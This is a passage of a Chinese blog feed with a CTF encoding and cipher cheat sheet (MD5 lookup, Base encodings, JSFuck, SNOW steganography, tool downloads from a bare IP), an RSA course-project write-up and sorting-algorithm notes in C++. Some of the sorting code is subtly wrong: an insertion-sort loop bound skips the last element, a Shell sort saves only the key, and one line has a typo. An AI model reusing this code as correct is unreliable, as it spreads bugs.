default-jdk</span><br></pre></td></tr></table></figure><p>重新打开gnuradio即可</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>到这里hackrf的基本环境就算安装完了，后面我预计会研究一下hackrf的小项目，做一些实验，也会同步更新我的博客，欢迎关注</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>加密编码(持续更新)</title>
      <link href="/2024/01/03/"/>
      <url>/2024/01/03/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章收录作者遇到的所有编码或密码。</p><h2 id="如何识别编码？"><a href="#如何识别编码？" class="headerlink" title="如何识别编码？"></a>如何识别编码？</h2><p>识别算法编码类型：</p><p>1.看位数</p><p>2.看特征（数字，字母，大小写，符合）</p><p>3.看当前密文所在地（web，数据库，操作系统）</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>解码网站：<a href="https://www.cmd5.com">https://www.cmd5.com</a></p><p>32位或16位由“0-9” “a-f”组成的字符串</p><p><strong>md5不可逆</strong></p><p><strong>破解方法</strong>：碰撞、枚举</p><p><strong>salt</strong></p><p>Discuz加盐</p><p>SHA1：与md5差不多，40位</p><h2 id="Base系列"><a href="#Base系列" class="headerlink" title="Base系列"></a>Base系列</h2><p>各类组合传输参数值</p><p>Base64、Base58、Base32、Base16、Base85、Base100等</p><p>提一嘴base100有emoji组成</p><p>可以使用<a href="https://cyberchef.org/解密大多数">https://cyberchef.org/解密大多数</a></p><p>没遇到的看这里www.atoolbox.net</p><h2 id="JS前端加密"><a href="#JS前端加密" class="headerlink" title="JS前端加密"></a>JS前端加密</h2><h3 id="JS颜文字"><a href="#JS颜文字" class="headerlink" title="JS颜文字"></a>JS颜文字</h3><p>一堆颜文字 按f12解密</p><p>解密网站：<a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a></p><h3 id="jother"><a href="#jother" class="headerlink" title="jother"></a>jother</h3><p>只用 ! + ( ) [ ] { }八个字符编码 f12解密</p><p>解密网站：<a href="http://tmxk.org/jother/">http://tmxk.org/jother/</a></p><h3 id="JSFUCK"><a href="#JSFUCK" class="headerlink" title="JSFUCK"></a>JSFUCK</h3><p>只用 ! + ( ) [ ]编码</p><p>解密网站：<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p><h2 id="后端加密"><a href="#后端加密" class="headerlink" title="后端加密"></a>后端加密</h2><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>乱码、头部信息</p><p><a href="http://dezend.qiling.org/free.html">http://dezend.qiling.org/free.html</a></p><h4 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h4><p>DLL封装代码文件</p><p>用ILSpy</p><p>这个工具下载作者提供链接：<a href="http://114.55.111.231/downloads/ILSpy.zip">http://114.55.111.231/downloads/ILSpy.zip</a></p><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><p>java&amp;class文件</p><h2 id="数据显示编码"><a href="#数据显示编码" class="headerlink" title="数据显示编码"></a>数据显示编码</h2><p>字符串数据显示编码</p><p>UTF-8/GBK</p><p>这个作者在base64转换时遇到的多，base64转换时候可能出现乱码，试试另一种文字比那吗就可以了</p><h2 id="杂项编码-密码"><a href="#杂项编码-密码" class="headerlink" title="杂项编码/密码"></a>杂项编码/密码</h2><p>本项有待不断补充</p><p>先记录作者做题遇到的吧，经典密码可以放放，比较容易的</p><h3 id="SNOW隐写解密"><a href="#SNOW隐写解密" class="headerlink" title="SNOW隐写解密"></a>SNOW隐写解密</h3><p>这个密码的特征就是一个文件里面有多余的不正常的换行符</p><p>提供下载链接：<a href="http://114.55.111.231/downloads/snow.exe">http://114.55.111.231/downloads/snow.exe</a></p><p>本工具为命令行工具，建立一个文件夹放入snow.exe工具，将要操作的文件放入文件夹中，在这个文件夹中打开终端进行操作。</p><p>操作方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//加密</span><br><span class="line">snow -C -m &quot;明文&quot; -p &quot;密码&quot; infile outfile</span><br><span class="line">//解密</span><br><span class="line">snow -C -p 密码&quot; file</span><br></pre></td></tr></table></figure><h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>以下工具是作者从网上收集的加解密的一些工具</p><p>超级加解密工具：<a href="http://114.55.111.231/downloads/supersoft.zip">http://114.55.111.231/downloads/supersoft.zip</a></p><p>CTF crack tools：<a href="http://114.55.111.231/downloads/cracktools.zip">http://114.55.111.231/downloads/cracktools.zip</a></p><p>字频统计：<a href="http://114.55.111.231/downloads/frequency.exe">http://114.55.111.231/downloads/frequency.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构课设-基于C++的RSA工具</title>
      <link href="/2023/12/16/"/>
      <url>/2023/12/16/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课设是笔者在学校的课程设计上自己构思的，基于c++实现，利用QT可视化。</p><p>本项目已经同步github<br><a href="https://github.com/cyan4run/RSA">https://github.com/cyan4run/RSA</a></p><p>经验不足，有一些算法还没有优化和改进会导致程序卡顿，可能在性能好的机子上会有些优化。</p><p>本项目的一些模块借鉴了其他大佬，如大数运算模块和miller-rabin算法，但是算力可能还是不够。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><h2 id="大整数运算模块"><a href="#大整数运算模块" class="headerlink" title="大整数运算模块"></a>大整数运算模块</h2><p>这个模块借鉴了github上部分项目<br>用字符串存取一个大整数，大整数的所有运算在BigInteger.cpp中完成。其中关键的运算是modpow和modInverse函数。这两个函数用于计算RSA。其中对运算符做了重载</p><h2 id="随机素数模块"><a href="#随机素数模块" class="headerlink" title="随机素数模块"></a>随机素数模块</h2><p>随机一个指定位数的模块，但是这个模块即使只做了一次素性检测，在大位时仍然很慢，采用随机素数文件封装在exe中，保证加密效率，但安全性下降。当然，QT工程里primes文件夹里就是我已经预先存储的素数，可以通过python的Crypto库生成随机素数，速度很快。<br>这个算法部分借鉴了某项目。</p><h2 id="RSA模块"><a href="#RSA模块" class="headerlink" title="RSA模块"></a>RSA模块</h2><p>整合了加密，解密模块在一个RSA类中，参见Rsa.cpp，Init函数将会随机生成素数并计算所有相关的RSA的值</p><p>作者一开始写的时候没有想到用户自己填写公钥加密的模块，有兴趣的可以加加。</p><h1 id="部署方案"><a href="#部署方案" class="headerlink" title="部署方案"></a>部署方案</h1><p>本项目即QT工程，直接在QT中打开选择编译架构即可运行。</p><p>封装好的exe文件也一并给出，这个exe是使用Enigma virtual box封装的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>getPrime.cpp有待优化，但目前够用。<br>各位大佬可以看看优化一下素数算法</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】排序</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="排序概述"><a href="#排序概述" class="headerlink" title="排序概述"></a>排序概述</h3><h4 id="排序方法的稳定性"><a href="#排序方法的稳定性" class="headerlink" title="排序方法的稳定性"></a>排序方法的稳定性</h4><p>当需要排序的关键字都不相同时，排序的结果是唯一的</p><p>当排序的关键字中存在相同的情况时，排序结果不唯一</p><p>在排序前后，含相等关键字的记录的相对位置保持不变，称这种排序方法是稳定的，反之，含相等关键字的记录的相对位置有可能改变，则称这种排序方法不稳定。</p><h4 id="内部排序和外部排序"><a href="#内部排序和外部排序" class="headerlink" title="内部排序和外部排序"></a>内部排序和外部排序</h4><p>在排序过程中，只使用计算机的内存存放排序记录，称这种排序为内部排序；</p><p>排序期间文件的全部记录不能同时存放在内存中，要借助计算机的外存才能完成排序，称为外部排序</p><p>内外存之间的数据交换次数是影响外部排序速度的主要因素</p><h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 1000 <span class="comment">//待排顺序表最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">  <span class="type">char</span> data;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">        KeyType key;<span class="comment">//关键字 整型类型</span></span><br><span class="line">        InfoType otherinfo;<span class="comment">//其他数据项</span></span><br><span class="line">&#125;RcdType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    RcdType r[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h4 id="排序方法的效率分析"><a href="#排序方法的效率分析" class="headerlink" title="排序方法的效率分析"></a>排序方法的效率分析</h4><p>1.时间复杂度：关键字的比较次数和记录移动次数</p><p>2.空间复杂度：执行算法所需的附加存储空间</p><p>3.稳定算法和不稳定算法</p><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h4><p>从第二个记录开始排序</p><p>经过第i趟排序，前i+1个记录有序</p><h5 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h5><p>1.将序列中的第一个记录看成是一个有序的子序列</p><p>2.从第二个记录起按关键字大小逐个进行插入，直至整个序列变成按关键字有序序列为止</p><p>从第二个记录到第n个记录，共n-1趟</p><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i<span class="number">-1</span>].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-1</span>;L.r[<span class="number">0</span>].key&lt;L.r[j].key;--j)&#123;</span><br><span class="line">                L.r[j+<span class="number">1</span>]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//插入排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>该算法在原序列呈正序排列时最省时间；在反序排列时最费时间</p><p>最好的情况</p><p>比较次数$\sum_{i=1}^{n-1} 1=n-1$    移动次数：0</p><p>最坏的情况</p><p>比较次数$\sum_{i=2}^{n} i=(n+2)(n-1)/2$     移动次数：$\sum_{i=2}^n (i+1)=(n+4)(n-1)/2$</p><p>平均$O(n^2)$</p><p>直接插入排序是<strong>稳定的</strong>排序方法</p><p>算法效率：</p><p>时间复杂度</p><p>最好情况：比较$O(n)$，移动$O(1)$</p><p>最坏情况：比较$O(n^2)$，移动$O(n^2)$</p><p>平均$O(n^2)$</p><p>空间复杂度：$O(1)$</p><h4 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h4><p>采用的是折半查找在有序区找到插入的位置</p><h5 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BiInsertSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,low,high,mid;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=L.length;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i<span class="number">-1</span>].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            low=<span class="number">1</span>;high=i<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">                mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(L.r[<span class="number">0</span>].key&lt;L.r[mid].key)&#123;</span><br><span class="line">                    high=mid<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    low=mid+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=high+<span class="number">1</span>;--j)&#123;</span><br><span class="line">                L.r[j+<span class="number">1</span>]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//折半插入</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-1"><a href="#算法分析-1" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：折半插入排序是稳定的排序</p><p>2.算法效率：</p><p>时间复杂度：平均$O(n^2)$</p><p>空间复杂度：$O(1)$</p><h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><h5 id="算法概述-1"><a href="#算法概述-1" class="headerlink" title="算法概述"></a>算法概述</h5><p>1.将记录序列分为若干子序列，分别对每个子序列进行插入排序 将n个记录分成d个子序列</p><p>2.d称为增量，在排序过程中逐渐减小，直至最后一趟排序减为1</p><h5 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellInsert</span><span class="params">(SqList &amp;L,<span class="type">int</span> dk)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=dk+<span class="number">1</span>;i&lt;=L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i-dk].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>].key=L.r[i].key;</span><br><span class="line">            <span class="keyword">for</span>(j=i-dk;j&gt;<span class="number">0</span>&amp;&amp;L.r[<span class="number">0</span>].key&lt;L.r[j].key;j-=dk)&#123;</span><br><span class="line">                L.r[j+dk]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+dk]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span class="params">(SqList &amp;L,<span class="type">int</span> dlta[],<span class="type">int</span> t )</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;t;k++)&#123;</span><br><span class="line">        <span class="built_in">ShellInsert</span>(L, dlta[k]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//希尔排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-2"><a href="#算法分析-2" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：希尔排序是不稳定的排序方法、</p><p>2.算法效率：</p><p>时间复杂度平均$O(n^{1.3})$到平均$O(n^{1.5})$</p><p>空间复杂度：$O(1)$</p><h4 id="起泡排序"><a href="#起泡排序" class="headerlink" title="起泡排序"></a>起泡排序</h4><h5 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h5><p>1.从第一个记录开始两两比较记录的关键字，若L.r[i].key&gt;L.r[i+1].key,则将两个记录交换</p><p>2.第一趟比较结构将序列中关键字最大的记录放到最后一个位置，而最小的上浮一个位置</p><p>3.n个记录比较n-1趟</p><h5 id="算法实现-3"><a href="#算法实现-3" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,noswap;RcdType temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=L.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        noswap=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=L.length<span class="number">-1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L.r[j].key&gt;L.r[j+<span class="number">1</span>].key)&#123;</span><br><span class="line">                temp=L.r[j];</span><br><span class="line">                L.r[j]=L.r[j+<span class="number">1</span>];</span><br><span class="line">                L.r[j+<span class="number">1</span>]=temp;</span><br><span class="line">                noswap=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(noswap)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//起泡排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-3"><a href="#算法分析-3" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：起泡排序是稳定的排序方法</p><p>2.时间复杂性</p><p>最好情况：比较$O(n)$，移动$O(1)$</p><p>最坏情况：比较$O(n^2)$，移动$O(n^2)$</p><p>平均情况：$O(n^2)$</p><p>3.空间复杂性：$O(1)$</p><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><h5 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h5><p>任取待排序列中的某个对象v，以它关键字大小为基准将整个序列分为左右两个子序列：</p><p>左侧子序列中所有对象的关键字都小于或等于对象v的关键字</p><p>右侧子序列中所有对象的关键字都大于或等于对象v的关键字</p><p>对象v则排在这两个子序列中间（最终位置）</p><h5 id="算法实现-4"><a href="#算法实现-4" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Partition</span><span class="params">(SqList &amp;L,<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    KeyType pivotkey;</span><br><span class="line">    L.r[<span class="number">0</span>]=L.r[low];<span class="comment">//枢轴元素记录在r[0]</span></span><br><span class="line">    pivotkey=L.r[low].key;</span><br><span class="line">    RcdType temp;</span><br><span class="line">    <span class="keyword">while</span> (low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;(L.r[high].key&gt;=pivotkey))</span><br><span class="line">            --high;</span><br><span class="line">      L.r[low]=L.r[high];</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;L.r[low].key&lt;=pivotkey)</span><br><span class="line">            ++low;</span><br><span class="line">      L.r[high]=L.r[low];</span><br><span class="line">    &#125;</span><br><span class="line">    L.r[low]=L.r[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;<span class="comment">//返回枢轴位置</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QSort</span><span class="params">(SqList &amp;L,<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> pivotloc;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line">        pivotloc=<span class="built_in">Partition</span>(L, low, high);</span><br><span class="line">        <span class="built_in">QSort</span>(L, low, pivotloc<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">QSort</span>(L, pivotloc+<span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//快速排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-4"><a href="#算法分析-4" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：快速排序不稳定</p><p>2.算法效率</p><p>最坏情况：时间复杂度$O(n^2)$，空间复杂度$O(n)$</p><p>最好情况：时间复杂度$O(nlog_2n)$，空间复杂度$O(log_2n)$</p><p>对于时间复杂性的最好情况来说，每次选择的基准是把左右分为相等的两部分；</p><p>最好情况的时间复杂度为$O(nlog_2n)$</p><p>平均时间复杂度也是$O(nlog_2n)$</p><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><h5 id="算法思想-2"><a href="#算法思想-2" class="headerlink" title="算法思想"></a>算法思想</h5><p>1.第一次从个关键字中选择一个最小值，确定第一个；</p><p>2.第二次从剩余元素中再选择一个最小值，确定第二个</p><p>3.共n-1次选择</p><h5 id="算法实现-5"><a href="#算法实现-5" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,low;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        low=i;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;=L.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L.r[j].key&lt;L.r[low].key)&#123;</span><br><span class="line">                low=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i!=low)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            L.r[i]=L.r[low];</span><br><span class="line">            L.r[low]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//选择排序</span></span><br></pre></td></tr></table></figure><h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><h5 id="算法思想-3"><a href="#算法思想-3" class="headerlink" title="算法思想"></a>算法思想</h5><p>堆排序属于选择排序，出发点是利用选择排序已经发生过的比较，记住比较的结果，减少重复比较的次数。</p><p>堆的定义：</p><p>n个元素的关键字序列A[1].key，A[2].key，…，A[n].key,当且仅当满足下述关系时称为堆：</p><p>小根堆：</p><script type="math/tex; mode=display">\begin{cases}A[i].key \leqslant A[2*i].key \\且                           \\                                                    A[i].key \leqslant A[2*i+1].key\end{cases}</script><p>大根堆：</p><script type="math/tex; mode=display">\begin{cases}A[i].key \geqslant A[2*i].key \\且                           \\                                                    A[i].key \geqslant A[2*i+1].key\end{cases}</script><p>堆是一棵采用顺序存储结构的完全二叉树</p><p>堆的根结点是关键字序列中的最小（或最大）值，分别称为小（或大）根堆</p><p>堆排序需要解决的问题：</p><p>1.由一个无需序列建成一个堆</p><p>2.输出堆顶元素后，调整剩余的元素称为一个新的堆</p><h5 id="算法概要（采用大根堆）"><a href="#算法概要（采用大根堆）" class="headerlink" title="算法概要（采用大根堆）"></a>算法概要（采用大根堆）</h5><p>1.按关键字建立A[1],A[2],…,A[n]的大根堆</p><p>2.输出堆顶元素，采用堆顶元素A[1]与最后一个元素A[n]交换，最大元素得到正确的排序位置</p><p>3.此时，前n-1个元素不再满足堆的特性，需要重建堆</p><p>4.循坏执行2，3到排序完成</p><h5 id="算法实现-6"><a href="#算法实现-6" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HeapType</span>&#123;</span><br><span class="line">    RcdType r[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapAdjust</span><span class="params">(HeapType &amp;H,<span class="type">int</span> s,<span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    RcdType rc;</span><br><span class="line">    rc=H.r[s];</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">2</span>*s;j&lt;=m;j*=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j&lt;m&amp;&amp;H.r[j].key&lt;H.r[j+<span class="number">1</span>].key)</span><br><span class="line">            ++j;</span><br><span class="line">        <span class="keyword">if</span>(rc.key&gt;=H.r[j].key) <span class="keyword">break</span>;</span><br><span class="line">        H.r[s]=H.r[j];</span><br><span class="line">        s=j;</span><br><span class="line">    &#125;</span><br><span class="line">    H.r[s]=rc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(HeapType &amp;H)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    RcdType temp;</span><br><span class="line">    <span class="keyword">for</span>(i=H.length/<span class="number">2</span>;i&gt;<span class="number">0</span>;--i)&#123;</span><br><span class="line">        <span class="built_in">HeapAdjust</span>(H, i, H.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=H.length;i&gt;<span class="number">1</span>;--i)&#123;</span><br><span class="line">        temp=H.r[i];</span><br><span class="line">        H.r[i]=H.r[<span class="number">1</span>];</span><br><span class="line">        H.r[<span class="number">1</span>]=temp;</span><br><span class="line">        <span class="built_in">HeapAdjust</span>(H, <span class="number">1</span>, i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//HeapSort</span></span><br></pre></td></tr></table></figure><p>总结：</p><p>1.将无序序列构成一个堆</p><p>2.将堆顶元素与末尾元素交换，将最大元素沉到数组末端</p><p>3.重新调整结构，并继续调整+交换</p><h5 id="算法分析-5"><a href="#算法分析-5" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.堆排序是不稳定的排序</p><p>2.时间复杂度为：$O(nlog_2n)$</p><p>3.空间复杂度：$O(1)$</p><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><p>将两多个有序表合成一个新的有序表</p><h5 id="算法实现-7"><a href="#算法实现-7" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">oid <span class="title">Merge</span><span class="params">(RcdType SR[], RcdType TR[], <span class="type">int</span> i, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> j, k;</span><br><span class="line">    <span class="keyword">for</span> (j = m + <span class="number">1</span>, k = i; i &lt;= m &amp;&amp; j &lt;= n; ++k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (SR[i].key &lt; SR[j].key) TR[k] = SR[i++];</span><br><span class="line">        <span class="keyword">else</span> TR[k] = SR[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m) TR[k++] = SR[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= n) TR[k++] = SR[j++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Msort</span><span class="params">(RcdType A[], RcdType B[], <span class="type">int</span> n, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, t;</span><br><span class="line">    <span class="keyword">while</span> (i + <span class="number">2</span> * d - <span class="number">1</span> &lt;= n) &#123;</span><br><span class="line">        <span class="built_in">Merge</span>(A, B, i, i + d - <span class="number">1</span>, i + <span class="number">2</span> * d - <span class="number">1</span>);</span><br><span class="line">        i = i + <span class="number">2</span> * d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i + d - <span class="number">1</span> &lt;= n) &#123;</span><br><span class="line">        <span class="built_in">Merge</span>(A, B, i, i + d - <span class="number">1</span>, n);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (t = i; t &lt;= n; t++) &#123;</span><br><span class="line">            B[t] = A[t];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(RcdType A[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> d = <span class="number">1</span>;</span><br><span class="line">    RcdType *B = (RcdType *)<span class="built_in">malloc</span>((n + <span class="number">1</span>) * <span class="built_in">sizeof</span>(RcdType));</span><br><span class="line">    <span class="keyword">while</span> (d &lt; n) &#123;</span><br><span class="line">        <span class="built_in">Msort</span>(A, B, n, d);</span><br><span class="line">        d = <span class="number">2</span> * d;</span><br><span class="line">        <span class="built_in">Msort</span>(B, A, n, d);</span><br><span class="line">        d = <span class="number">2</span> * d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">&#125;<span class="comment">//归并排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-6"><a href="#算法分析-6" class="headerlink" 